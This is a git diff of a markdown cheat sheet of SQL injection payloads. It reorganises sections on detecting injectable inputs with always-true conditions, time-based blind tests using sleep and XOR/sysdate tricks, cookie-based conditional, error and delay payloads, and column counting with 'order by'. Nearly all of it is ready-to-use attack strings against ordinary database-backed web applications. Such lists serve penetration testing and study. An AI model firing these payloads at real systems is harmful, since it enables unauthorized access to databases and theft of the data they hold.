@@ -1,5 +1,12 @@
-## Parameter
+## Determinig SQLi Vulnerablity
+```sql
 
+1 or 1=1-- - >> Input box non string.
+1' or 1=1-- - >> Input box string.
+1' or 'abc'='abc'-- -
+1') or 1=1-- -
+
+## Parameter Testing For Time Blind
 ```sql
 
 or sleep(5)
@@ -7,23 +14,16 @@ or sleep(5)
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
 1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH
 
-#Cookie testing
+## Cookie testing 
+```sql
 
 1. ' and 1=1-- - >> Conditional response
 2. ' || (select ' ') || ' >> Conditional error
 3. ' ||  (SELECT SLEEP(10))-- - >> Time delays
 
 
-#Determinig SQLi Vulnerablity
-
-1 or 1=1-- - >> Input box non string.
-
-1' or 1=1-- - >> Input box string.
-
-1') or 1=1-- -
-
-
-#Determining column numbers
+## Determining column numbers
+```sql
 
 ' order by 1-- -
 
